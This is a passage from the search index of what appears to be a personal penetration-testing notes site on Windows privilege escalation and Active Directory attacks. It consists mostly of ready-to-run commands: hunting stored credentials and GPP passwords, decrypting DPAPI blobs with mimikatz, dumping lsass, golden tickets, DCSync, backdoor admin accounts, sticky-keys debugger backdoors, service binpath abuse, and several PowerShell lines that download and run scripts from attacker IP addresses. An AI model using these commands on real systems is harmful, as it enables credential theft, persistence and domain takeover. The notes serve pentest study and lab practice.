1, 2 or ffffffff ? The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ dlls not loaded ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user )","title":"CWDIllegalInDllSearch"},{"location":"windows/windows-privilege-escalation/#setdlldirectory","text":"Removes the current working directory (CWD) from the search order SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) : The directory from which the application loaded [ added ] C :\\ program files \\ MyApp \\ 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ removed ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) SetDllDirectory(\"\") The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) [ removed ] The current working directory ( CWD ) Directories in the PATH environment variable ( system then user )","title":"SetDllDirectory"},{"location":"windows/windows-privilege-escalation/#safedllsearchmode","text":"Enabled by default Can disable using [ HKEY_LOCAL_MACHINE \\ SYSTEM \\ CurrentControlSet \\ Control \\ Session Manager ] Calling the SetDllDirectory(\u201c\u201d) or SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) disables SafeDllSearchMode and uses the search order described for SetDllDirectory.","title":"SafeDllSearchMode"},{"location":"windows/windows-privilege-escalation/#dev","text":"LoadLibraryEx (additional argument) SetEnvironmentVariable(TEXT(\u201cPATH\u201d),NULL) Change default installation folder to C:\\Program Files Fully qualified path when loading DLLs Use SetDllDirectory(\u201c\u201d) API removing the current working directory from the search order If software needs to be installed on the root check there are no binaries needing SYSTEM privileges If SYSTEM privileges are required then change the ACL\u2019s of the folder Remove the path entry from the SYSTEM path variable if not needed When enabled The directory from which the application loaded 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) The current working directory ( CWD ) Directories in the PATH environment variable ( system then user ) When disabled The directory from which the application loaded [ moved up the list ] The current working directory ( CWD ) 32 - bit System directory ( C :\\ Windows \\ System32 ) 16 - bit System directory ( C :\\ Windows \\ System ) Windows directory ( C :\\ Windows ) Directories in the PATH environment variable ( system then user )","title":"DEV"},{"location":"windows/windows-privilege-escalation/#stored-credentials","text":"C : \\ unattend . xml C : \\ sysprep . inf C : \\ sysprep \\ sysprep . xml dir c : \\ * vnc . ini / s / b / c dir c : \\ * ultravnc . ini / s / b / c dir c : \\ / s / b / c | findstr / si * vnc . ini findstr / si password * . txt | * . xml | * . ini findstr / si pass * . txt | * . xml | * . ini","title":"Stored Credentials"},{"location":"windows/windows-privilege-escalation/#unattended-installations","text":"post / windows / gather / enum_unattend Look for UserAccounts tag of Unattend . xml , sysprep . xml and sysprep . inf across the system, including: C : \\ Windows \\ Panther \\ C : \\ Windows \\ Panther \\ Unattend \\ C : \\ Windows \\ System32 \\ C : \\ Windows \\ System32 \\ sysprep \\ Microsoft appends \"Password\" to all passwords within Unattend files before encoding them.","title":"Unattended Installations"},{"location":"windows/windows-privilege-escalation/#group-policy-preferences-gpp","text":"Introduced from Windows Server 2008 https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati GPP allows for configuration of Domain-attached machines via group policy . Map drives (Drives.xml) Create Local Users Data Sources (DataSources.xml) Printer configuration (Printers.xml) Create/Update Services (Services.xml) Scheduled Tasks (ScheduledTasks.xml) Change local Administrator passwords GPPs are stored in the SYSVOL share, which is world-readable to authenticated users. \\\\ DOMAIN \\ SYSVOL \\ DOMAIN \\ Policies \\ findstr / S / I cpassword \\\\ FQDN \\ sysvol \\ FQDN \\ policies \\ * . xml Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the logged - in user and pull down policies. Group Policies for account management are stored on the Domain Controller in Groups . xml files buried in the SYSVOL folder ( \\\\ Domain \\ SYSVOL \\ DOMAIN \\ Policies ) cpassword is used to set passwords for the Local Administrator account. Password is AES-256 encrypted using a published key: https://msdn.microsoft.com/en-us/library/Cc422924.aspx Metasploit: post / windows / gather / credentials / gpp PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 Get-CachedGPPPassword //For locally stored GP Files Get-GPPPassword //For GP Files stored in the DC Get - DecryptedPassword to decrypt the AES encryption http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip https://pentestlab.blog/tag/cpassword/ Decrypt encrypted password: gpp - decrypt $ cpassword Get - GPPPassword Get - NetOU - GUID {4C86DD57-4040-41CD-B163-58F208A26623} | % { Get - NetComputer - ADSPath $ _ } // All OUs connected to policy | List all domain machines tied to OU IEX ( New - Object Net . WebClient ). DownloadString ( http://192.168.100.3/tmp/PowerUp.ps1 ) IEX ( New - Object Net . WebClient ). DownloadString ( http://192.168.100.3/tmp/PowerView.ps1 ) Get - CachedGPPPassword Future - Local Administrator Password Solution (LAPS): https://www.microsoft.com/en-us/download/details.aspx?id=46899","title":"Group Policy Preferences (GPP)"},{"location":"windows/windows-privilege-escalation/#defense","text":"Prevent passwords from getting added to GPP (KB2962486) and delete existing GPP from SYSVOL containing passwords. [ALERTING] Detect by setting Everyone:DENY on SYSVOL GPP file. (Logs: Audit access denied)","title":"Defense"},{"location":"windows/windows-privilege-escalation/#token-impersonation","text":"PowerSploit / Incognito List all tokens Invoke - TokenManipulation - ShowAll List all unique and usable tokens Invoke - TokenManipulation - Enumerate Start new process with token of a user Invoke - TokenManipulation - ImpersonateUser - Username domain\\user Start new process with token of another process Invoke - TokenManipulation - CreateProcess C:\\Windown\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe - ProcessId 500","title":"Token Impersonation"},{"location":"windows/windows-privilege-escalation/#cmdkey","text":"Creates, lists, and deletes stored user names and passwords or credentials. Usable with \"runas /savecred\" cmdkey / list Run a command as admin: runas / user : ACCESS \\ Administrator / savecred \u200b powershell - c IEX ( New - Object Net . Webclient ). downloadstring ( http://10.10.14.2/admin.ps1 ) powershell . exe - Credential TestDomain\\Me - NoNewWindow - ArgumentList Start-Process powershell.exe -Verb runAs Find all runas shortcuts: Get - ChildItem \u200b \u200b C:\\ \u200b * . lnk - Recurse - Force | ft fullname | \u200b Out - File \u200b shortcuts . txt ForEach \u200b ( \u200b $ file \u200b \u200b in \u200b gc . \\ shortcuts . txt ) { \u200b Write - Output \u200b \u200b $ file \u200b ; gc \u200b $ file \u200b | Select - String \u200b runas }","title":"cmdkey"},{"location":"windows/windows-privilege-escalation/#windows-data-protection-api","text":"Locating credential files cmd\u200b /c \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault \u200b dir\u200b /S /AS C : \\Users\\security\\AppData\\Local\\Microsoft\\Credentials \u200b dir\u200b /S /AS C : \\Users\\security\\AppData\\Local\\Microsoft\\Protect \u200b dir\u200b /S /AS C : \\Users\\security\\AppData\\Roaming\\Microsoft\\Vault \u200b dir\u200b /S /AS C : \\Users\\security\\AppData\\Roaming\\Microsoft\\Credentials \u200b dir\u200b /S /AS C : \\Users\\security\\AppData\\Roaming\\Microsoft\\Protect Transfer [Convert]::ToBase64String([IO.File]::ReadAllBytes(\u200b C:\\Users\\security\\AppData\\Roamin g\\Microsoft\\Credentials\\51AB168BE4BDB3A603DADE4F8CA81290 \u200b )) [IO.File]::WriteAllBytes(\u200b 51AB168BE4BDB3A603DADE4F8CA81290 \u200b , [Convert]::FromBase64String(\u200b AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6 VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI ABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAA AA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7 c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WH hvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxd lugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHC KaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/z BU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ == \u200b )) Extraction credential file - masterkey (guidMasterKey) - https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials dpapi::\u200b cred\u200b /\u200b in\u200b :51\u200b AB168BE4BDB3A603DADE4F8CA81290 /\u200b sid:S\u200b -1-5-21-953262931-566350628-63446256-1001 /\u200b password\u200b :4\u200b Cc3ssC0ntr0ller Examine master key file dpapi::\u200b masterkey\u200b /\u200b in\u200b :0792\u200b c32e\u200b -48\u200b a5\u200b -4\u200b fe3\u200b -8\u200b b43\u200b - \u200b d93d64590580 /\u200b sid:S\u200b -1-5-21-953262931-566350628-63446256-1001 /\u200b password\u200b :4\u200b Cc3ssC0ntr0ller Decrypt credential blob dpapi::\u200b cred\u200b /\u200b in\u200b :51\u200b AB168BE4BDB3A603DADE4F8CA81290","title":"Windows Data Protection API"},{"location":"windows/windows-privilege-escalation/#using-kernel-exploit","text":"Installed updates: wmic qfe get Caption,Description,HotFixID,InstalledOn KiTrap0d","title":"Using Kernel Exploit"},{"location":"windows/windows-privilege-escalation/#using-logical-flaws","text":"","title":"Using logical flaws"},{"location":"windows/windows-privilege-escalation/#other","text":"","title":"Other"},{"location":"windows/windows-privilege-escalation/#directory-replication-service-drsr","text":"","title":"Directory Replication Service (DRSR)"},{"location":"windows/windows-privilege-escalation/#netlogon-remote-service-nrpc","text":"","title":"Netlogon Remote Service (NRPC)"},{"location":"windows/windows-privilege-escalation/#backupkey-remote-service-bkrp","text":"","title":"BackupKey Remote Service (BKRP)"},{"location":"windows/windows-privilege-escalation/#local-service-authority-domain-policy-remote-protocol-lsad","text":"","title":"Local Service Authority (Domain Policy) Remote Protocol (LSAD)"},{"location":"windows/windows-privilege-escalation/#privilege-attribute-certificate-data-structure-pac","text":"","title":"Privilege Attribute Certificate Data Structure (PAC)"},{"location":"windows/windows-privilege-escalation/#kerberos","text":"","title":"Kerberos"},{"location":"windows/windows-privilege-escalation/#kerberos-protocol-extension-kile","text":"","title":"Kerberos Protocol Extension (KILE)"},{"location":"windows/windows-privilege-escalation/#kerberos-protocol-extension-service-for-user-and-constrained-delegation-protocol-sfu","text":"","title":"Kerberos Protocol Extension, Service for User and Constrained Delegation Protocol (SFU)"},{"location":"windows/windows-privilege-escalation/#add-user-using-service-misconfiguration","text":"","title":"Add user using service misconfiguration"},{"location":"windows/windows-privilege-escalation/#powerup","text":"Perform all checks: Invoke - AllChecks Services with unquoted paths and a space in their name: Get - ServiceUnquoted - Verbose Service binary in a location writable to current user (Replace the binary to gain code execution): Get - ModifiableServiceFile - Verbose Service can be modified by current user: Get - ModifiableService - Verbose","title":"PowerUp"},{"location":"windows/windows-privilege-escalation/#references","text":"https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ http://www.greyhathacker.net/?p=738 https://toshellandback.com/2015/11/24/ms-priv-esc https://www.toshellandback.com/2015/08/30/gpp/","title":"References"},{"location":"windows/windows/","text":"Quick References Commands prevesc: https://guif.re/windowseop VMs: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ Versions Windows 1 . 0 1 . 04 Windows 2 . 0 2 . 11 Windows 3 . 0 3 Windows NT 3 . 1 3 . 10 . 528 Windows for Workgroups 3 . 11 3 . 11 Windows NT Workstation 3 . 5 3 . 5 . 807 Windows NT Workstation 3 . 51 3 . 51 . 1057 Windows 95 4 . 0 . 950 Windows NT Workstation 4 . 0 4 . 0 . 1381 Windows 98 4 . 1 . 1998 Windows 98 Second Edition 4 . 1 . 2222 Windows Me 4 . 90 . 3000 Windows 2000 Professional 5 . 0 . 2195 Windows XP 5 . 1 . 2600 Windows Vista 6 . 0 . 6000 Windows 7 6 . 1 . 7600 Windows 8 . 1 6 . 3 . 9600 Windows 10 10 . 0 . 10240 User Accounts LocalSystem account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx Very high-privileged built-in account. Extensive privileges on the local system and acts as the computer on the network. The actual name of the account is NT AUTHORITY \\ SYSTEM . Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY \\ SYSTEM and BUILTIN \\ Administrators SIDs; these accounts have access to most system objects. The name of the account in all locales is . \\ LocalSystem . The name, LocalSystem or ComputerName \\ LocalSystem can also be used. This account does not have a password. If you specify the LocalSystem account in a call to the CreateService or ChangeServiceConfig function, any password information you provide is ignored. The service can open the registry key HKEY_LOCAL_MACHINE\\SECURITY. The service presents the computer's credentials to remote servers. If the service opens a command window and runs a batch file, the user could hit CTRL+C to terminate the batch file and gain access to a command window with LocalSystem permissions. A service that runs in the context of the LocalSystem account inherits the security context of the SCM. The user SID is created from the SECURITY_LOCAL_SYSTEM_RID value. Has: E_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (enabled) SE_BACKUP_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_CREATE_PAGEFILE_NAME (enabled) SE_CREATE_PERMANENT_NAME (enabled) SE_CREATE_TOKEN_NAME (disabled) SE_DEBUG_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INC_BASE_PRIORITY_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_LOAD_DRIVER_NAME (disabled) SE_LOCK_MEMORY_NAME (enabled) SE_MANAGE_VOLUME_NAME (disabled) SE_PROF_SINGLE_PROCESS_NAME (enabled) SE_RESTORE_NAME (disabled) SE_SECURITY_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_SYSTEM_ENVIRONMENT_NAME (disabled) SE_SYSTEMTIME_NAME (disabled) SE_TAKE_OWNERSHIP_NAME (disabled) SE_TCB_NAME (enabled) SE_UNDOCK_NAME (disabled) LocalService account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx Has the same level of access to resources and objects as members of the Users group. This limited access helps safeguard the system if individual services or processes are compromised. Services that run as the Local Service account access network resources as a null session without credentials. Local Service account is not supported for the SQL Server or SQL Server Agent services. The actual name of the account is NT AUTHORITY \\ LOCAL SERVICE . Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has minimum privileges on the local computer and presents anonymous credentials on the network. Can be specified in a call to the CreateService and ChangeServiceConfig functions. This account does not have a password, so any password information that you provide in this call is ignored. While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the LookupAccountSid function, but the name of the account must be NT AUTHORITY \\ LocalService when you call CreateService or ChangeServiceConfig , regardless of the locale, or unexpected results can occur. The LocalService account has its own subkey under the HKEY_USERS registry key. Therefore, the HKEY_CURRENT_USER registry key is associated with the LocalService account. Has: SE_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_UNDOCK_NAME (disabled) Any privileges assigned to users and authenticated users NetworkService account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx Has more access to resources and objects than members of the Users group. Services that run as the Network Service account access network resources by using the credentials of the computer account . The actual name of the account is NT AUTHORITY \\ NETWORK SERVICE . Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has minimum privileges on the local computer and acts as the computer on the network. This account can be specified in a call to the CreateService and ChangeServiceConfig functions. This account does not have a password, so any password information that you provide in this call is ignored. While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the LookupAccountSid function, but the name of the account must be NT AUTHORITY \\ NetworkService when you call CreateService or ChangeServiceConfig , regardless of the locale, or unexpected results can occur. A service that runs in the context of the NetworkService account presents the computer's credentials to remote servers. By default, the remote token contains SIDs for the Everyone and Authenticated Users groups. The user SID is created from the SECURITY_NETWORK_SERVICE_RID value. Has its own subkey under the HKEY_USERS registry key. Therefore, the HKEY_CURRENT_USER registry key is associated with the NetworkService account. Has: SE_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_UNDOCK_NAME (disabled) Any privileges assigned to users and authenticated users Convert string to little-endian: iconv - to - code UTF - 16 LE Should be done before base64 encoding for - ExecuteCommand in powershell Enumeration Tips Ref: https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/ Check the policies related to Network Access Control . Whether it can be bypassed or not. Go for guest wifi . It could lead you to get inside the company network if it is not segregated. Check for the printers in the environment. Try to do printer exploitation. Printers are part of domain network too. Try default passwords. Check for misconfigurations in the systems as well as the network. At the Domain level, always look for Administrators group members instead of going just for Domain Admins . Reason being Builtin Administrators group is the superior one. Even \"Domain Admins\" group is also the member of administrators groups. Look for User Rights Assignments in the GPOs . They get checked very rarely. The ones which are configured for Domain Controllers actually have domain rights. Most of the organizations use the same image for all of their deployments . Which means they use same local admin password . Always check if same local admin account is being used in whole domain. Identify Admin Restrictions . (Logon Hours, LogonWorkstations) Decoys can be detected using this. Use Responder to collect NTLM hashes . Check SYSVOL too. ShareEnum to look for file shares. Recon IP, subnet, default gateway etc: ipconfig / all Current user name, info in current access token, SID, privs and group that current user belongs to: whoami / all Local groups on current machine: net localgroup Local administrators of current machine: net localgroup administrators Active tcp connections, ports, which the computer is listening, ethernet statistics, ip routing table: netstat - an Running processes with verbose mode: tasklist / V Startup programs: net start Windows services with binary paths: sc qc service OS, processor, memory, bios related info: systeminfo output . txt Scheduled jobs: schtasks / query / fo LIST / v Patches installed and figuring out if its missing important any patch: wmic qfe get Caption , Description , HotFixID , InstalledOn Domain Network Recon Mapping of IP address to its MAC address in the network: arp - a Domain: echo % USERDOMAIN % Domain controller name: echo % logonserver % List of domain users: net user / domain List of groups in the domain: net group / domain AD domain password policy: net accounts / domain Map AD trust relationships: nltest / domain_trusts Alternate Data Stream (ADS) Listing: dir / R Find Streams: \u200b get - item - path * . * - stream * Reading: \u200b powershell Get - Content - Path hm.txt - Stream root.txt Reading: get - content backup . zip - stream pass Reading: streams . exe / accepteula - s from sysinternals Services Registry entries: HKLM \\ SYSTEM \\ CurrentControlSet \\ Services View service properties: sc qc Vulnerable Service / net start Restarting: sc stop Vulnerable Service / net stop name Start: sc start Vulnerable Service / net start name Service information: Get - Service \u200b \u200b Ubiquiti UniFi Video \u200b | fl * Restart PC: shutdown / r / t 0 Change binary path: sc config Vulnerable Service binpath = net user eviladmin P4ssw0rd @ / add Disable: sc config servicename start = disabled Enable: sc config servicename start = demand Auto: sc config servicename start = auto Keep alive - When a service starts in Windows operating systems, it must communicate with the Service Control Manager . If it's not, Service Control Manager will terminates the process. Installing MSI msiexec / quiet / qn / i malicious . msi / quiet = Suppress any messages to the user during installation / qn = No GUI / i = Regular ( vs . administrative ) installation Extract ZIP Add-Type -assembly system.io.compression.filesystem ; [io.compression.zipfile] :: ExtractToDirectory ( C:\\backup.zip , C:\\Example\\ ) View File Systems gdr - PSProvider FileSystem Access shared volume net use y : \\\\ 10 . 10 . 10 . 57 \\ c $ / user : administrator 1234 test Open password protected share net use \\\\ server \\ share / user : test testpassword start \\\\ server \\ share Auto Save Password to PowerShell reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2 nul | findstr DefaultUserName DefaultDomainName DefaultPassword $passwd = ConvertTo-SecureString Welcome1! -AsPlainText -Force ; $creds = New-Object System . Management . Automation . PSCredential ( administrator $passwd ) \u200b Start-Process -FilePath powershell -argumentlist IEX(New-Object Net.webClient).downloadString( http:// LAB IP /writeup ) -Credential $creds Permissions: whoami / priv View Permisions: cacls C : \\ Users \\ Administrator \\ Desktop \\ root . txt Grant Permissions cacls C : \\ Users \\ Administrator \\ Desktop \\ root . txt / grant Alfred : F cacls c:\\users\\Administrator\\Desktop\\root.txt / E / P Alfred : F cacls Windows utility to view / edit file permissions / E to edit ACL / P to set permissions Alfred : F to give Alfred full control of the file https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490872(v=technet.10) icacls C:\\Program Files (x86)\\Program Folder OI This folder and files CI This folder and subfolders IO The ACE does not apply to the current file / directory . No output message : This folder only ( IO )( CI ) This folder , subfolders and files ( OI )( CI )( IO ) Subfolders and files only ( CI )( IO ) Subfolders only ( OI )( IO ) Files only SSH from Windows to Attacker (Kali) Manual From Windows: plink . exe - l root - pw - R 445 : 127 . 0 . 0 . 1 : 445 10 . 10 . 14 . 8 From Attacker: netstat -ano | grep 445 winexe -U Administrator //127.0.0.1 cmd.exe Metasploit portfwd add -l 445 -p 445 -r 127 .0.0.1 use exploit/windows/smb/psexec set SMBDOMAIN CHATTERBOX set SMBUSER Administrators set SMBPASS Welcome1! set RHOST 127 .0.0.1 exploit Add user and enable RDP net user hacker hacker /add net localgroup /add Administrators hacker reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f Windows file association Hashes - ps - S lsass . exe - hashdump Bypasses ftp.exe to open processes: https://twitter.com/yeyint_mth/status/1009732492138442752 If the user is a member of the Administrators group then, we can invoke IFileOperation methods to copy, move, rename, create, and delete files without any additional permissions. This is a well-known technique used by malware. https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-ifileoperation While using the IFileOperation by default it doesn\u2019t ask for the UAC Popup iwr - UseBasicParsing - Uri \u200b http://10.10.1.2/FileZilla Server.exe \u200b - OutFile C:\\Users\\sysadmin\\AppData\\Local\\Temp\\FileZilla Server.exe iex ( New - Object Net . WebClient ). DownloadString ( http://\u200b10.10.1.2\u200b/Invoke-IFileOperation.ps1 ) Invoke - IFileOperation $ IFileOperation | Get - Member $ IFileOperation . RenameItem ( C:\\Program Files (x86)\\FileZilla Server\\FileZilla Server.exe , Original.exe ) $ IFileOperation . PerformOperations () $ IFileOperation . MoveItem ( \u200bC:\\Users\\sysadmin\\AppData\\Local\\Temp\\FileZilla Server.exe\u200b , \u200bC:\\Program Files (x86)\\FileZilla Server\\ , FileZilla Server.exe\u200b ) $ IFileOperation . PerformOperations () Tools Patch Extractor : https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d ntdsXtract - Active Directory forensic framework: https://github.com/csababarta/ntdsxtract Extract users from ESE DB export: dsusers.py kotarak.dit.export/datatable.3 kotarak.dit.export/link_table.5 hashdump --syshive kotarak.bin --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc Practice: HTB: Kotarak LibEseDB - library to access the Extensible Storage Engine (ESE) Database File (EDB) format: https://github.com/libyal/libesedb The ESE database format is used in may different applications like Windows Search, Windows Mail, Exchange, Active Directory, etc. Dump tables: esedbexport - m tables 20170721114636 _default_192 . 168 . 110 . 133 _psexec . ntdsgrab . _333512 . dit Practice: HTB: Kotarak WinEXE - remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package): https://sourceforge.net/projects/winexe/ PowerUpSQL: Dumping Active Directory Domain Info \u2013 with PowerUpSQL!: https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/ Bloodhound - uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify: https://github.com/BloodHoundAD/BloodHound BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment: https://github.com/BloodHoundAD/BloodHound Find where domain admins are logged in: python http : // bloodhound . py - u USERNAME - p PASSWORD - d DOMAIN_NAME - dc DOMAIN_CONTROLLER_HOSTNAME neo4j start bloodhound LDIFDE: Import/Export information from AD Sys Internals: https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx PsExec - Execute processes on remote machine PsFile - Displays list of files opened remotely. PsGetSid - Translate SID to display name and vice versa PsKill - Kill processes on local or remote machine PsInfo - Displays installation, install date, kernel build, physical memory, processors type and number, etc. PsList - Displays process, CPU, Memory, thread statistics PsLoggedOn - Displays local and remote logged users PsLogList - View Event logs localrecon.cmd: Utility to generate a summary of a Windows system: https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd Empire: post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent: https://github.com/EmpireProject/Empire Seatbelt: C# project that performs a number of security oriented host-survey \"safety checks\": https://github.com/GhostPack/Seatbelt Mimikatz Mimikatz 2.0 - Golden Ticket Walkthrough: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html General commands: privilege :: debug sekurlsa :: logonPasswords full sekurlsa :: pth / user : Administrator / domain : WOSHUB / ntlm :{ NTLM_hash } / run : cmd . exe misc :: skeleton ipconfig / all whoami / user lsadump :: lsa / inject / name : krbtgt kerbros :: golden / domain :[ Domain ] / sid :[ SID ] / rc4 :[ NTLM Hash ] / user :[ Username To Create ] / id : 500 / ptt pushd \\\\ WINSERVER01 \\ c $ cd WINDOWS \\ NTDS If WDigest is disabled: reg add HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ SecurityProviders \\ WDigest / v UseLogonCredential / t REG_DWORD / d 1 Export memory dump and use it in Mimikatz: Get - Process lsass | Out - Minidump sekurlsa :: minidump lsass_592 . dmp Using VMWare / Hibernate file: http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/ Mimikatz features: https://adsecurity.org/?page_id=1821 DCSync https://adsecurity.org/?p=1729 mimikatz lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt mimikatz lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator \"impersonates\" a Domain Controller and requests account password data from the targeted Domain Controller. Required Permissions: Any member of Administrators , Domain Admins , or Enterprise Admins as well as Domain Controller computer accounts. Read-Only Domain Controllers are not allowed to pull password data for users by default. Prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the KRBTGT password hash to create Golden Tickets With DCSync, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit). Internals: Discovers Domain Controller in the specified domain name. Requests the Domain Controller replicate the user credentials via GetNCChanges (leveraging Directory Replication Service (DRS) Remote Protocol) The client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one. The response contains a set of updates that the client has to apply to its NC replica. It is possible that the set of updates is too large for only one response message . In those cases , multiple DSGetNCChanges requests and responses are done . This process is called replication cycle or simply cycle . When a DC receives a DSReplicaSync Request, then for each DC that it replicates from (stored in RepsFrom data structure) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC. So it gets up-to-date AD objects from each of the DC\u2019s which it replicates from. PsExec References: https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec https://www.toshellandback.com/2017/02/11/psexec/ http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html Important Endpoints Connection endpoints for Windows 10: https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints Registry Important Registry Locations Installed programs: HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Uninstall Gain system shell at login using 5x[shift]: HKLM : \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image File Execution Options \\ sethc . exe with property Debugger set to cmd . exe HKLM : \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image File Execution Options \\ utilman . exe with property Debugger set to cmd . exe Disable macro security: Enable EDP: reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server / v fDenyTSConnections / t REG_DWORD / d 0 / f Ways to access registry cmd: cmd / c REG QUERY Powershell: Get - Item path For remote use: Enter - PSSession and inside the session use Get - Item WMI (StdRegProv) To find IDs use: https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1 $ RemoteReg = Get - WmiObject - List StdRegProv - ComputerName name - Credential cred $ RemoteReg | Select - Object - ExpandProperty methods | more $ RemoteReg . getStringValue ( id , path , propertyName ) .Net [ Microsoft . Win32 . RegistryKey ]. getMethods () https://archive.codeplex.com/?p=psremoteregistry Tasks Recently used commands Installed apps Turn off network level auth Attach debugger to setg.exe Credentials Cheatsheet: https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/credential-search.md Stored Credentials Creates, lists, and deletes stored user names and passwords or 